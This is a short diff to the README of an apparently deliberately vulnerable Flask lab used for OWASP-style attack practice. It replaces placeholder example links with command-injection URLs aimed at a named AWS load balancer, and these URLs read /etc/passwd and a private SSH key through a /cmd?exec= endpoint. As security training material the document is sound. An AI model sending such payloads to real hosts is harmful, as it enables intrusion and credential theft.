@@ -105,9 +105,12 @@ On the Attacker VM, run K6.js and owasp_attack.sh
 
 Submit OS commands via the vulnerable Flask app:
 
-- [Run `cat /etc/passwd`](http://<victim_IP>:5000/cmd?exec=cat%20/etc/passwd)
-- [Run `ls -la`](http://<victim_IP>:5000/cmd?exec=ls%20-la)
+***(aws ALB) http://samv-alb-1759994858.ca-central-1.elb.amazonaws.com:5000/***
 
+```bash
+http://samv-alb-1759994858.ca-central-1.elb.amazonaws.com:5000/cmd?exec=cat%20/etc/passwd
+http://samv-alb-1759994858.ca-central-1.elb.amazonaws.com:5000/cmd?exec=cat%20/.ssh/id_rsa
+```
 ---
 
 ### 💬 Reflected XSS
